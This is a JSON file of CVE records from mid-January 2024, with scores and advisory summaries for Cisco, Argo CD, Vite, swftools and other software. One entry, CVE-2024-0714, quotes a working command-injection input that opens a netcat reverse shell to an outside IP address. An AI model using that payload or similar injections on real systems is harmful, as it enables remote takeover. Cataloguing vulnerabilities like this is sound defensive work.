{
  "CVE-2024-20251": {
    "cvss": 4.8,
    "description": "A vulnerability in the web-based management interface of Cisco Identity Services Engine (ISE) could allow an authenticated, remote attacker to perform a stored cross-site scripting (XSS) attack against a user of the interface on an affected device. This vulnerability exists because the web-based management interface does not properly validate user-supplied input. An attacker could exploit this vulnerability by injecting malicious code into specific pages of the interface. A successful exploit could allow the attacker to execute arbitrary script code in the context of the affected interface or access sensitive, browser-based information.",
    "published": "2024-01-17T17:15:11.350",
    "keywords": "remote,sensitive"
  },
  "CVE-2024-20270": {
    "cvss": 4.8,
    "description": "A vulnerability in the web-based management interface of Cisco BroadWorks Application Delivery Platform and Cisco BroadWorks Xtended Services Platform could allow an authenticated, remote attacker to conduct a stored cross-site scripting (XSS) attack against a user of the interface.\r\n\r This vulnerability exists because the web-based management interface does not properly validate user-supplied input. An attacker could exploit this vulnerability by persuading a user of the interface to click a crafted link. A successful exploit could allow the attacker to execute arbitrary script code in the context of the affected interface or access sensitive, browser-based information.",
    "published": "2024-01-17T17:15:11.627",
    "keywords": "remote,sensitive"
  },
  "CVE-2024-20272": {
    "cvss": 7.3,
    "description": "A vulnerability in the web-based management interface of Cisco Unity Connection could allow an unauthenticated, remote attacker to upload arbitrary files to an affected system and execute commands on the underlying operating system. This vulnerability is due to a lack of authentication in a specific API and improper validation of user-supplied data. An attacker could exploit this vulnerability by uploading arbitrary files to an affected system. A successful exploit could allow the attacker to store malicious files on the system, execute arbitrary commands on the operating system, and elevate privileges to root.",
    "published": "2024-01-17T17:15:12.130",
    "keywords": "remote,unauthenticated,authentication,command"
  },
  "CVE-2024-20277": {
    "cvss": 6.8,
    "description": "A vulnerability in the web-based management interface of Cisco ThousandEyes Enterprise Agent, Virtual Appliance installation type, could allow an authenticated, remote attacker to perform a command injection and elevate privileges to root. This vulnerability is due to insufficient validation of user-supplied input for the web interface. An attacker could exploit this vulnerability by sending a crafted HTTP packet to the affected device. A successful exploit could allow the attacker to execute arbitrary commands and elevate privileges to root.",
    "published": "2024-01-17T17:15:12.300",
    "keywords": "remote,command"
  },
  "CVE-2024-20287": {
    "cvss": 6.5,
    "description": "A vulnerability in the web-based management interface of the Cisco WAP371 Wireless-AC/N Dual Radio Access Point (AP) with Single Point Setup could allow an authenticated, remote attacker to perform command injection attacks against an affected device. This vulnerability is due to improper validation of user-supplied input. An attacker could exploit this vulnerability by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit this vulnerability, the attacker must have valid administrative credentials for the device.",
    "published": "2024-01-17T17:15:12.467",
    "keywords": "remote,command"
  },
  "CVE-2024-22416": {
    "url": "https://github.com/pyload/pyload/commit/c7cdc18ad9134a75222974b39e8b427c4af845fc",
    "cvss": 9.6,
    "description": "pyLoad is a free and open-source Download Manager written in pure Python. The `pyload` API allows any API call to be made using GET requests. Since the session cookie is not set to `SameSite: strict`, this opens the library up to severe attack possibilities via a Cross-Site Request Forgery (CSRF) attack. As a result any API call can be made via a CSRF attack by an unauthenticated user. This issue has been addressed in release `0.5.0b3.dev78`. All users are advised to upgrade.",
    "published": "2024-01-18T00:15:38.397"
  },
  "CVE-2024-22317": {
    "cvss": 9.1,
    "description": "IBM App Connect Enterprise 11.0.0.1 through 11.0.0.24 and 12.0.1.0 through 12.0.11.0 could allow a remote attacker to obtain sensitive information or cause a denial of service due to improper restriction of excessive authentication attempts.  IBM X-Force ID:  279143.",
    "published": "2024-01-18T14:15:07.970",
    "keywords": "remote,authentication,sensitive"
  },
  "CVE-2024-22419": {
    "url": "https://github.com/vyperlang/vyper/commit/55e18f6d128b2da8986adbbcccf1cd59a4b9ad6f",
    "cvss": 7.3,
    "description": "Vyper is a Pythonic Smart Contract Language for the Ethereum Virtual Machine. The `concat` built-in can write over the bounds of the memory buffer that was allocated for it and thus overwrite existing valid data. The root cause is that the `build_IR` for `concat` doesn't properly adhere to the API of copy functions (for `>=0.3.2` the `copy_bytes` function). A contract search was performed and no vulnerable contracts were found in production. The buffer overflow can result in the change of semantics of the contract. The overflow is length-dependent and thus it might go unnoticed during contract testing. However, certainly not all usages of concat will result in overwritten valid data as we require it to be in an internal function and close to the return statement where other memory allocations don't occur. This issue has been addressed in commit `55e18f6d1` which will be included in future releases. Users are advised to update when possible.",
    "published": "2024-01-18T19:15:10.550"
  },
  "CVE-2024-22422": {
    "cvss": 7.5,
    "description": "AnythingLLM is an application that turns any document, resource, or piece of content into context that any LLM can use as references during chatting. In versions prior to commit `08d33cfd8` an unauthenticated API route (file export) can allow attacker to crash the server resulting in a denial of service attack. The \u201cdata-export\u201d endpoint is used to export files using the filename parameter as user input. The endpoint takes the user input, filters it to avoid directory traversal attacks, fetches the file from the server, and afterwards deletes it. An attacker can trick the input filter mechanism to point to the current directory, and while attempting to delete it the server will crash as there is no error-handling wrapper around it. Moreover, the endpoint is public and does not require any form of authentication, resulting in an unauthenticated Denial of Service issue, which crashes the instance using a single HTTP packet. This issue has been addressed in commit `08d33cfd8`. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "published": "2024-01-19T01:15:09.123",
    "keywords": "unauthenticated,authentication"
  },
  "CVE-2024-22424": {
    "cvss": 8.3,
    "description": "Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. The Argo CD API prior to versions 2.10-rc2, 2.9.4, 2.8.8, and 2.7.15 are vulnerable to a cross-server request forgery (CSRF) attack when the attacker has the ability to write HTML to a page on the same parent domain as Argo CD. A CSRF attack works by tricking an authenticated Argo CD user into loading a web page which contains code to call Argo CD API endpoints on the victim\u2019s behalf. For example, an attacker could send an Argo CD user a link to a page which looks harmless but in the background calls an Argo CD API endpoint to create an application running malicious code. Argo CD uses the \u201cLax\u201d SameSite cookie policy to prevent CSRF attacks where the attacker controls an external domain. The malicious external website can attempt to call the Argo CD API, but the web browser will refuse to send the Argo CD auth token with the request. Many companies host Argo CD on an internal subdomain. If an attacker can place malicious code on, for example, https://test.internal.example.com/, they can still perform a CSRF attack. In this case, the \u201cLax\u201d SameSite cookie does not prevent the browser from sending the auth cookie, because the destination is a parent domain of the Argo CD API. Browsers generally block such attacks by applying CORS policies to sensitive requests with sensitive content types. Specifically, browsers will send a \u201cpreflight request\u201d for POSTs with content type \u201capplication/json\u201d asking the destination API \u201care you allowed to accept requests from my domain?\u201d If the destination API does not answer \u201cyes,\u201d the browser will block the request. Before the patched versions, Argo CD did not validate that requests contained the correct content type header. So an attacker could bypass the browser\u2019s CORS check by setting the content type to something which is considered \u201cnot sensitive\u201d such as \u201ctext/plain.\u201d The browser wouldn\u2019t send the preflight request, and Argo CD would happily accept the contents (which are actually still JSON) and perform the requested action (such as running malicious code). A patch for this vulnerability has been released in the following Argo CD versions: 2.10-rc2, 2.9.4, 2.8.8, and 2.7.15. The patch contains a breaking API change. The Argo CD API will no longer accept non-GET requests which do not specify application/json as their Content-Type. The accepted content types list is configurable, and it is possible (but discouraged) to disable the content type check completely. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "published": "2024-01-19T01:15:09.317",
    "keywords": "sensitive,bypass"
  },
  "CVE-2024-0705": {
    "cvss": 9.8,
    "description": "The Stripe Payment Plugin for WooCommerce plugin for WordPress is vulnerable to SQL Injection via the 'id' parameter in all versions up to, and including, 3.7.9 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.",
    "published": "2024-01-19T10:15:34.287",
    "keywords": "unauthenticated,sensitive"
  },
  "CVE-2024-0714": {
    "cvss": 6.3,
    "description": "A vulnerability was found in MiczFlor RPi-Jukebox-RFID up to 2.5.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file userScripts.php of the component HTTP Request Handler. The manipulation of the argument folder with the input ;nc 104.236.1.147 4444 -e /bin/bash; leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251540. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.",
    "published": "2024-01-19T15:15:08.997",
    "keywords": "remote,command"
  },
  "CVE-2024-22562": {
    "url": "https://github.com/matthiaskramm/swftools/issues/210",
    "cvss": "-",
    "description": "swftools 0.9.2 was discovered to contain a Stack Buffer Underflow via the function dict_foreach_keyvalue at swftools/lib/q.c.",
    "published": "2024-01-19T15:15:09.463"
  },
  "CVE-2024-22920": {
    "url": "https://github.com/matthiaskramm/swftools/issues/211",
    "cvss": "-",
    "description": "swftools 0.9.2 was discovered to contain a heap-use-after-free via the function bufferWriteData in swftools/lib/action/compile.c.",
    "published": "2024-01-19T15:15:09.560"
  },
  "CVE-2024-22911": {
    "url": "https://github.com/matthiaskramm/swftools/issues/216",
    "cvss": "-",
    "description": "A stack-buffer-underflow vulnerability was found in SWFTools v0.9.2, in the function parseExpression at src/swfc.c:2602.",
    "published": "2024-01-19T18:15:08.680"
  },
  "CVE-2024-22912": {
    "url": "https://github.com/matthiaskramm/swftools/issues/212",
    "cvss": "-",
    "description": "A global-buffer-overflow was found in SWFTools v0.9.2, in the function countline at swf5compiler.flex:327. It allows an attacker to cause code execution.",
    "published": "2024-01-19T18:15:08.723"
  },
  "CVE-2024-22913": {
    "url": "https://github.com/matthiaskramm/swftools/issues/213",
    "cvss": "-",
    "description": "A heap-buffer-overflow was found in SWFTools v0.9.2, in the function swf5lex at lex.swf5.c:1321. It allows an attacker to cause code execution.",
    "published": "2024-01-19T18:15:08.767"
  },
  "CVE-2024-22914": {
    "url": "https://github.com/matthiaskramm/swftools/issues/214",
    "cvss": "-",
    "description": "A heap-use-after-free was found in SWFTools v0.9.2, in the function input at lex.swf5.c:2620. It allows an attacker to cause denial of service.",
    "published": "2024-01-19T18:15:08.807"
  },
  "CVE-2024-22915": {
    "url": "https://github.com/matthiaskramm/swftools/issues/215",
    "cvss": "-",
    "description": "A heap-use-after-free was found in SWFTools v0.9.2, in the function swf_DeleteTag at rfxswf.c:1193. It allows an attacker to cause code execution.",
    "published": "2024-01-19T18:15:08.847"
  },
  "CVE-2024-22919": {
    "url": "https://github.com/matthiaskramm/swftools/issues/209",
    "cvss": "-",
    "description": "swftools0.9.2 was discovered to contain a global-buffer-overflow vulnerability via the function parseExpression at swftools/src/swfc.c:2587.",
    "published": "2024-01-19T18:15:08.950"
  },
  "CVE-2024-22955": {
    "url": "https://github.com/matthiaskramm/swftools/issues/207",
    "cvss": "-",
    "description": "swftools 0.9.2 was discovered to contain a stack-buffer-underflow vulnerability via the function parseExpression at swftools/src/swfc.c:2576.",
    "published": "2024-01-19T18:15:09.003"
  },
  "CVE-2024-22956": {
    "url": "https://github.com/matthiaskramm/swftools/issues/208",
    "cvss": "-",
    "description": "swftools 0.9.2 was discovered to contain a heap-use-after-free vulnerability via the function removeFromTo at swftools/src/swfc.c:838",
    "published": "2024-01-19T18:15:09.050"
  },
  "CVE-2024-22957": {
    "url": "https://github.com/matthiaskramm/swftools/issues/206",
    "cvss": "-",
    "description": "swftools 0.9.2 was discovered to contain an Out-of-bounds Read vulnerability via the function dict_do_lookup in swftools/lib/q.c:1190.",
    "published": "2024-01-19T18:15:09.093"
  },
  "CVE-2024-0731": {
    "cvss": 5.3,
    "description": "A vulnerability has been found in PCMan FTP Server 2.0.7 and classified as problematic. This vulnerability affects unknown code of the component PUT Command Handler. The manipulation leads to denial of service. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-251554 is the identifier assigned to this vulnerability.",
    "published": "2024-01-19T20:15:13.120",
    "keywords": "remote,command"
  },
  "CVE-2024-0732": {
    "cvss": 5.3,
    "description": "A vulnerability was found in PCMan FTP Server 2.0.7 and classified as problematic. This issue affects some unknown processing of the component STOR Command Handler. The manipulation leads to denial of service. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251555.",
    "published": "2024-01-19T20:15:13.353",
    "keywords": "remote,command"
  },
  "CVE-2024-23331": {
    "cvss": 7.5,
    "description": "Vite is a frontend tooling framework for javascript. The Vite dev server option `server.fs.deny` can be bypassed on case-insensitive file systems using case-augmented versions of filenames. Notably this affects servers hosted on Windows. This bypass is similar to CVE-2023-34092 -- with surface area reduced to hosts having case-insensitive filesystems. Since `picomatch` defaults to case-sensitive glob matching, but the file server doesn't discriminate; a blacklist bypass is possible. By requesting raw filesystem paths using augmented casing, the matcher derived from `config.server.fs.deny` fails to block access to sensitive files. This issue has been addressed in vite@5.0.12, vite@4.5.2, vite@3.2.8, and vite@2.9.17. Users are advised to upgrade. Users unable to upgrade should restrict access to dev servers.",
    "published": "2024-01-19T20:15:14.070",
    "keywords": "sensitive,bypass"
  },
  "CVE-2024-23679": {
    "cvss": "-",
    "description": "Enonic XP versions less than 7.7.4 are vulnerable to a session fixation issue. An remote and unauthenticated attacker can use prior sessions due to the lack of invalidating session attributes.\n\n",
    "published": "2024-01-19T21:15:10.073",
    "keywords": "remote,unauthenticated"
  }
}